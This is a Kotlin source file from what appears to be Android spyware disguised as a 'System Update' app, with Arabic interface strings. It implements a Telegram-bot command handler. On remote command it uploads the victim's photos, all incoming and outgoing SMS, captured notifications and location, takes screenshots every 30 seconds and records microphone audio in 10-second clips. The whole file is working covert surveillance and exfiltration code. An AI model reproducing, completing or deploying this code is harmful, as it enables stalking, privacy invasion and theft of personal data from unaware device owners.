package com.sys.update

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File

object CommandExecutor {

    private val runningJobs = java.util.concurrent.ConcurrentHashMap<String, Boolean>()

    @Volatile
    var screenLoopActive: Boolean = false
        private set

    fun handle(ctx: Context, callbackData: String, callbackId: String) {
        TelegramApi.answerCallback(callbackId)
        Log.d("CmdExec", "executing: $callbackData")

        when {
            callbackData == "menu" -> showMainMenu(ctx)
            callbackData == "info" -> showDeviceInfo(ctx)
            callbackData == "location" -> showLocation(ctx)
            callbackData == "photos_all" -> fetchAllPhotos(ctx)
            callbackData == "photos_50" -> fetchLastPhotos(ctx, 50)
            callbackData == "photos_200" -> fetchLastPhotos(ctx, 200)
            callbackData == "sms_all" -> fetchAllSms(ctx)
            callbackData == "notifs_all" -> fetchAllNotifs(ctx)
            callbackData == "audio_start" -> startAudio(ctx)
            callbackData == "audio_stop" -> stopAudio(ctx)
            callbackData == "screen_once" -> captureOnce(ctx)
            callbackData == "screen_loop_start" -> startScreenLoop(ctx)
            callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
            callbackData == "fetch_all" -> fetchEverything(ctx)
            callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
            else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
        }
    }

    fun handleText(ctx: Context, text: String) {
        val cmd = text.trim().lowercase()
        when {
            cmd == "/start" || cmd == "/menu" -> showMainMenu(ctx)
            cmd == "/info" -> showDeviceInfo(ctx)
            cmd == "/photos" -> fetchAllPhotos(ctx)
            cmd == "/sms" -> fetchAllSms(ctx)
            cmd == "/notifs" -> fetchAllNotifs(ctx)
            cmd == "/audio_start" -> startAudio(ctx)
            cmd == "/audio_stop" -> stopAudio(ctx)
            cmd == "/screen" -> captureOnce(ctx)
            cmd == "/screen_loop" -> startScreenLoop(ctx)
            cmd == "/screen_stop" -> stopScreenLoop(ctx)
            cmd == "/all" -> fetchEverything(ctx)
            cmd.startsWith("/photos") -> {
                val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
                fetchLastPhotos(ctx, n)
            }
            else -> TelegramApi.sendMessage("اكتب /menu لعرض القائمة")
        }
    }

    private fun showMainMenu(ctx: Context) {
        val text = """
            🎛 *لوحة التحكم — System Update*

            اختر العملية من الأزرار أدناه:
        """.trimIndent()
        TelegramApi.sendMessage(text, KeyboardBuilder.mainMenu())
    }

    private fun showDeviceInfo(ctx: Context) {
        val info = DeviceInfo.getFullInfo(ctx)
        TelegramApi.sendMessage(info, KeyboardBuilder.backToMenu())
    }

    private fun captureOnce(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.\\nأعد فتح التطبيق ووافق على الطلب.", KeyboardBuilder.backToMenu())
            return
        }
        runJob(ctx, "screen_once") {
            val file = ScreenCapture.capture(ctx)
            if (file != null && file.exists()) {
                TelegramApi.sendPhoto(file, "📷 لقطة شاشة — ${DeviceInfo.getQuickInfo(ctx)}")
                file.delete()
            } else {
                TelegramApi.sendMessage("❌ فشل التقاط الشاشة", KeyboardBuilder.backToMenu())
            }
        }
    }

    private fun startScreenLoop(ctx: Context) {
        if (!ScreenCapture.isReady) {
            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.", KeyboardBuilder.backToMenu())
            return
        }
        if (screenLoopActive) {
            TelegramApi.sendMessage("📷 اللقطات المتكررة شغّالة بالفعل")
            return
        }
        screenLoopActive = true
        TelegramApi.sendMessage("📷 ✅ بدأ اللقطات المتكررة\\n⏱ كل 30 ثانية", KeyboardBuilder.mainMenu())
    }

    private fun stopScreenLoop(ctx: Context) {
        screenLoopActive = false
        TelegramApi.sendMessage("📷 ⏹ تم إيقاف اللقطات المتكررة", KeyboardBuilder.mainMenu())
    }

    private fun fetchAllPhotos(ctx: Context) {
        runJob(ctx, "photos_all") {
            val all = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, all, "📸 كل الصور (${all.size})")
        }
    }

    private fun fetchLastPhotos(ctx: Context, n: Int) {
        runJob(ctx, "photos_$n") {
            val all = MediaScanner.scanImages(ctx).take(n)
            sendPhotosList(ctx, all, "📸 آخر $n صورة")
        }
    }

    private fun sendPhotosList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
        if (list.isEmpty()) {
            TelegramApi.sendMessage("📸 لا توجد صور", KeyboardBuilder.backToMenu())
            return
        }

        val jobId = "photos_${System.currentTimeMillis()}"
        runningJobs[jobId] = true

        val statusMsgId = TelegramApi.sendMessage(
            "$title\\n⏳ جاري الإرسال... 0/${list.size}",
            KeyboardBuilder.stopJob(jobId)
        )

        var sent = 0
        var failed = 0
        val startTime = System.currentTimeMillis()

        for (item in list) {
            if (runningJobs[jobId] != true) break
            val file = File(item.path)
            if (!file.exists()) { failed++; continue }

            val ok = TelegramApi.sendPhoto(file, item.name)
            if (ok) sent++ else failed++

            if ((sent + failed) % 10 == 0) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000
                TelegramApi.editMessage(
                    statusMsgId,
                    "$title\\n⏳ $sent ناجح / $failed فشل\\n⏱ مضى: ${elapsed}s",
                    KeyboardBuilder.stopJob(jobId)
                )
                Thread.sleep(500)
            }
        }

        runningJobs.remove(jobId)
        val elapsed = (System.currentTimeMillis() - startTime) / 1000
        TelegramApi.editMessage(
            statusMsgId,
            "$title\\n✅ انتهى\\n📤 $sent أرسلت\\n❌ $failed فشلت\\n⏱ ${elapsed}s",
            KeyboardBuilder.backToMenu()
        )
    }

    private fun fetchAllSms(ctx: Context) {
        runJob(ctx, "sms_all") {
            val inbox = SmsReader.scanAll(ctx)
            val sent = SmsReader.scanSent(ctx)
            val all = (inbox + sent).sortedByDescending { it.optString("date") }

            if (all.isEmpty()) {
                TelegramApi.sendMessage("📩 لا توجد رسائل", KeyboardBuilder.backToMenu())
                return@runJob
            }

            val grouped = all.groupBy { it.optString("address", "unknown") }
            val sb = StringBuilder()
            sb.append("📩 *تقرير SMS* — ${all.size} رسالة\\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\\n\\n")

            for ((address, msgs) in grouped) {
                sb.append("📞 *$address* (${msgs.size})\\n")
                for (m in msgs.take(5)) {
                    val type = if (m.optString("type") == "sms_sent") "📤" else "📥"
                    val body = m.optString("body", "").take(80)
                    sb.append("  $type $body\\n")
                }
                if (msgs.size > 5) sb.append("  … +${msgs.size - 5}\\n")
                sb.append("\\n")

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }

            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    private fun fetchAllNotifs(ctx: Context) {
        runJob(ctx, "notifs_all") {
            val lines = DataStore.drain(ctx, limit = 5000)
            val notifs = lines.mapNotNull { line ->
                try {
                    val obj = JSONObject(line)
                    if (obj.optString("type") == "notif") obj else null
                } catch (_: Exception) { null }
            }

            if (notifs.isEmpty()) {
                TelegramApi.sendMessage("🔔 لا توجد إشعارات", KeyboardBuilder.backToMenu())
                return@runJob
            }

            val grouped = notifs.groupBy { it.optString("pkg", "unknown") }
            val sb = StringBuilder()
            sb.append("🔔 *الإشعارات* — ${notifs.size} إشعار\\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\\n\\n")

            for ((pkg, items) in grouped) {
                sb.append("📱 *$pkg* (${items.size})\\n")
                for (n in items.take(5)) {
                    val t = n.optString("title", "")
                    val tx = n.optString("text", "")
                    if (t.isNotBlank()) sb.append("  ▸ $t\\n")
                    if (tx.isNotBlank()) sb.append("    $tx\\n")
                }
                if (items.size > 5) sb.append("  … +${items.size - 5}\\n")
                sb.append("\\n")

                if (sb.length > 3500) {
                    TelegramApi.sendMessage(sb.toString())
                    sb.clear()
                }
            }

            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
        }
    }

    private fun startAudio(ctx: Context) {
        if (AudioRecorder.isRunning()) {
            TelegramApi.sendMessage("🎤 التسجيل شغّال بالفعل")
            return
        }
        AudioRecorder.startLoop(ctx)
        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل التلقائي\\n📤 مقطع كل 10 ثواني",
            KeyboardBuilder.mainMenu())
    }

    private fun stopAudio(ctx: Context) {
        AudioRecorder.stopLoop(ctx)
        TelegramApi.sendMessage("🎤 ⏹ تم إيقاف التسجيل", KeyboardBuilder.mainMenu())
    }

    private fun fetchEverything(ctx: Context) {
        runJob(ctx, "all") {
            TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\\n\\n1️⃣ صور...")
            Thread.sleep(500)

            val photos = MediaScanner.scanImages(ctx)
            sendPhotosList(ctx, photos, "📸 الصور")

            TelegramApi.sendMessage("2️⃣ *SMS...*")
            Thread.sleep(500)
            fetchAllSms(ctx)

            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
            Thread.sleep(500)
            fetchAllNotifs(ctx)

            TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
        }
    }

    private fun stopJob(ctx: Context, jobId: String) {
        runningJobs[jobId] = false
        runningJobs.remove(jobId)
        TelegramApi.sendMessage("🛑 تم إيقاف العملية", KeyboardBuilder.mainMenu())
    }

    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
        Thread {
            try {
                block()
            } catch (e: Exception) {
                Log.e("CmdExec", "job $jobName err: ${e.message}")
                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
            }
        }.start()
    }
}
